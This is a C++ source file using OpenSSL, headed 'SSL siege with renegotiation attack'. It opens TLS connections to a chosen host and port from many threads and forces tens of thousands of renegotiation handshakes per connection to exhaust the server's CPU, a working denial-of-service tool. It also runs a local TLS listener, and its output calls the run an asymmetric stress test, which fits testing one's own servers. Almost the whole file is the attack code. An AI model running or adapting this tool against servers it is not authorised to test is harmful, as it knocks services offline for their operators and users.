/*
 * SSL siege with renegotiation attack
 * 8 September 2017
 * Chul-Woong Yang (cwyang)
 *
 */
#include <iostream>
#include <atomic>
#include <cstring>
#include <cerrno>
#include <cassert>
#include <vector>
#include <thread>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/lhash.h>
#include <openssl/ocsp.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/x509.h>
#include <openssl/ssl.h>
#include "siege.h"
#include "apps.h"

using namespace std;
const char *DEFAULT_HOST="127.0.0.1";
const int DEFAULT_PORT=1111;
const int DEFAULT_LISTENPORT=2222;
const int DEFAULT_NUM = 100000;
const int DEFAULT_THR = 1;
const char *DEFAULT_CIPHER="AES128-SHA";
const char *DEFAULT_KEY="no_default_key";
const char *DEFAULT_CERT="no_default_cert";
const char *key = DEFAULT_KEY;
const char *cert = DEFAULT_CERT;

BIO *bio_err = NULL;
atomic_int reneg_cnt;
struct timeval tm_start, tm_end;

static int set_cert_key_stuff(SSL_CTX * ctx, X509 * cert, EVP_PKEY * key);

static void usage(void) 
{
    printf("usage: siege args\n");
    printf("\n");
    printf(" -host host                       (default:%s)\n", DEFAULT_HOST);
    printf(" -port port                       (default:%d)\n", DEFAULT_PORT);
    printf(" -listenport port                 (default:%d)\n", DEFAULT_LISTENPORT);
    printf(" -key server_key                  (default:%s)\n", DEFAULT_KEY);
    printf(" -cert server_cert                (default:%s)\n", DEFAULT_CERT);
    printf(" -num_thr iterations per threads  (default:%d)\n", DEFAULT_NUM);
    printf(" -thr number of threads           (default:%d)\n", DEFAULT_THR);
    printf(" -cipher       - preferred cipher to use, use the 'openssl ciphers'\n");
}

static int
init_client(int *sock, const char *host, const char *port, int type, int af)
{
    struct addrinfo hints, *ai_top, *ai;
    int i, s = -1;

    memset(&hints, '\0', sizeof(hints));
    hints.ai_family = af;
    hints.ai_socktype = type;

    if ((i = getaddrinfo(host, port, &hints, &ai_top)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(i));
        return (0);
    }
    if (ai_top == NULL || ai_top->ai_addr == NULL) {
        fprintf(stderr, "getaddrinfo returned no addresses\n");
        if (ai_top != NULL) {
            freeaddrinfo(ai_top);
        }
        return (0);
    }
    for (ai = ai_top; ai != NULL; ai = ai->ai_next) {
        s = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (s == -1) {
            continue;
        }
        if (type == SOCK_STREAM) {
            i = 0;
            i = setsockopt(s, SOL_SOCKET, SO_KEEPALIVE,
                           (char *) &i, sizeof(i));
            if (i < 0) {
                perror("keepalive");
                goto out;
            }
        }
        if ((i = connect(s, ai->ai_addr, ai->ai_addrlen)) == 0) {
            *sock = s;
            freeaddrinfo(ai_top);
            return (1);
        }
        close(s);
        s = -1;
    }

    perror("connect");
out:
    if (s != -1)
        close(s);
    freeaddrinfo(ai_top);
    return (0);
}

void worker(int id, const char *host, const int portnum, const int num, SSL_CTX *ctx) 
{
    SSL *con = SSL_new(ctx);
    BIO *sbio;
    char port[16];
    sprintf(port, "%d", portnum);

    int s, rc;
    
    if (init_client(&s, host, port, SOCK_STREAM, AF_UNSPEC) == 0) {
        fprintf(stderr, "connect:errno=%d\n", errno);
        goto end;
    }
    sbio = BIO_new_socket(s, BIO_NOCLOSE);
    SSL_set_bio(con, sbio, sbio);

    rc = SSL_connect(con);
    
    for (int i = 0; i < num; i++) {
        SSL_renegotiate(con);
        rc = SSL_do_handshake(con);
        int cnt = ++reneg_cnt;
        
        if ((cnt % 1000) == 0) {
            struct timeval now;
            gettimeofday(&now, NULL);
            
            printf("[%d.%03d] reneg: %d (%d)\n", 
                   now.tv_sec, now.tv_usec/1000, cnt, rc);
        }
    }

end:
    if (con != nullptr)
        SSL_free(con);
    return;
    
}

void srv_worker(int s, SSL_CTX *sctx) {
    SSL *con = SSL_new(sctx);
    BIO *sbio;
    
    int rc;

    SSL_clear(con);

    sbio = BIO_new_socket(s, BIO_NOCLOSE);
    SSL_set_bio(con, sbio, sbio);

    rc = SSL_accept(con);
    while (1) {
        char buf[1024];
        
        rc = SSL_read(con, buf, 1024);
//        int err = SSL_get_error(con, rc);
    }
}

void srv_acceptor(const int listenport, SSL_CTX *sctx) {
    struct sockaddr_in addr;
    
    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd < 0) {
        perror("socket");
        exit(1);
    }
    
    int flag = 1;
    if (setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR,  &flag, sizeof(flag)) != 0) {
        perror("setsockopt");
        exit(1);
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(listenport);

    if (bind(lfd, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(1);
    }
    if (listen(lfd, 1024) != 0) {
        perror("listen");
        exit(1);
    }
    
    printf("ready for stress test.\n");
    
    while (1) {
        struct sockaddr_in cli_addr;
        socklen_t cli_len;
        
        int fd = accept(lfd, (struct sockaddr *)&cli_addr, &cli_len);
        if (fd < 0) {
            perror("accept");
            exit(1);
        }
        thread th(srv_worker, fd, sctx);
        th.detach();
    }
}
                                               
int main(int argc, char *argv[]) 
{
    openssl_startup();
    thread_setup();
    reneg_cnt = 0;

    int badop = 0;
    const char * host = DEFAULT_HOST;
    int port = DEFAULT_PORT;
    int listenport = DEFAULT_LISTENPORT;
    int num_thr = DEFAULT_THR;
    int num = DEFAULT_NUM;
    const char *cipher = DEFAULT_CIPHER;

    bio_err = BIO_new_fp(stderr, BIO_NOCLOSE);
        
    const SSL_METHOD *meth = TLSv1_client_method();
    SSL_CTX *ctx = SSL_CTX_new(meth);

    const SSL_METHOD *smeth = TLSv1_server_method();
    SSL_CTX *sctx = SSL_CTX_new(smeth);

    if (ctx == NULL || sctx == NULL) {
        return 0;
    }

    argc--;
    argv++;

#define IFARG(CMD) \
    if(strcmp(*argv, "-"#CMD) == 0) {                          \
        if (--argc < 1)                                         \
            goto bad;                                           \
        CMD = *(++argv);                                        \
    }
#define IFNUMARG(CMD) \
    if(strcmp(*argv, "-"#CMD) == 0) {                           \
        if (--argc < 1)                                         \
            goto bad;                                           \
        CMD = atoi(*(++argv));                                  \
    }
    
    while (argc >= 1) {
        IFARG(host)
        else IFARG(cipher)
        else IFARG(key)
        else IFARG(cert)
        else IFNUMARG(port)
        else IFNUMARG(listenport)
        else IFNUMARG(num)
        else IFNUMARG(num_thr)
        else {
            badop = 1;
        }
        argc--;
        argv++;
    }
    if (badop) {
    bad:
        usage();
        return 0;
    }

    if (cipher != NULL)
        if (!SSL_CTX_set_cipher_list(ctx, cipher)) {
            fprintf(stderr, "error setting cipher list\n");
            return 0;
        }

    EVP_PKEY *s_key = load_key(bio_err, key, FORMAT_PEM, 0, NULL,
                               "server certificate private key file");
    if (!s_key) {
        ERR_print_errors(bio_err);
        return 0;
    }

    X509 *s_cert = load_cert(bio_err, cert, FORMAT_PEM,
                             NULL, "server certificate file");
    if (!s_cert) {
        ERR_print_errors(bio_err);
        return 0;
    }

    if (!set_cert_key_stuff(sctx, s_cert, s_key))
        return 0;
    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_OFF);
    SSL_CTX_set_session_cache_mode(sctx, SSL_SESS_CACHE_OFF);
    SSL_CTX_set_options(ctx, SSL_OP_NO_TICKET);
    SSL_CTX_set_options(sctx, SSL_OP_NO_TICKET);


    thread srv_thr(srv_acceptor, listenport, sctx);
    srv_thr.detach();

    usleep(100000);
    
    printf("\nSSL asymmetric stress test\n");
    printf("==========================\n");
#define COUNTDOWN 3
    for (int i = 0; i < COUNTDOWN; i++) {
        printf("starts in %d secs.\n", COUNTDOWN - i);
        sleep(1);
    }
    
    printf("sending %d renegotiation requests each from %d threads..\n", num, num_thr);
    gettimeofday(&tm_start, NULL);
    
    vector<thread> vec_thr;
    for (int i = 0; i < num_thr; i++) {
        thread th(worker, i, host, port, num, ctx);
        vec_thr.push_back(move(th));
    }
    for (auto& v: vec_thr)
        v.join();
    gettimeofday(&tm_end, NULL);

    printf("\nTotal %d sessions are processed in %d msec\n", 
           (int) reneg_cnt, timediff_ms(&tm_start, &tm_end));
    printf("%5.2f session per second\n", 
           (int) reneg_cnt * 1000 / (double) timediff_ms(&tm_start, &tm_end));

    if (ctx != nullptr)
        SSL_CTX_free(ctx);
    if (sctx != nullptr)
        SSL_CTX_free(sctx);

    cout << "Stress test done" << endl;

    return 0;
}

static int
set_cert_key_stuff(SSL_CTX * ctx, X509 * cert, EVP_PKEY * key)
{
    if (cert == NULL)
        return 1;
    if (SSL_CTX_use_certificate(ctx, cert) <= 0) {
        BIO_printf(bio_err, "error setting certificate\n");
        ERR_print_errors(bio_err);
        return 0;
    }
    if (SSL_CTX_use_PrivateKey(ctx, key) <= 0) {
        BIO_printf(bio_err, "error setting private key\n");
        ERR_print_errors(bio_err);
        return 0;
    }
    /*
     * Now we know that a key and cert have been set against the SSL
     * context
     */
    if (!SSL_CTX_check_private_key(ctx)) {
        BIO_printf(bio_err,
                   "Private key does not match the certificate public key\n");
        return 0;
    }
    return 1;
}
